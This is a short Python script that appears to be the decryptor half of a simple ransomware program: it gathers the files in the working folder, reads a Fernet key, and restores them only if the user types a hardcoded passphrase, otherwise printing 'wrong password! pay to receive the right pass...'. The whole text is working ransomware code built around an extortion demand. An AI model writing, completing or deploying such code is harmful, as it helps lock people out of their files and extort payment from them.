import os
from cryptography.fernet import Fernet

allfiles = []
for file in os.listdir():
    if file == "main.py" or file == "key.key" or file == "decr.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

with open("key.key", "rb") as key:
    password = key.read()

passphrase = "lUc1f3r11"
userpass = input("enter the password you received from us: ")
if userpass == passphrase:
    for file in allfiles:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        content_decr = Fernet(password).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(content_decr)
        print("you got your files back")
else:
    print("wrong password! pay to receive the right pass...")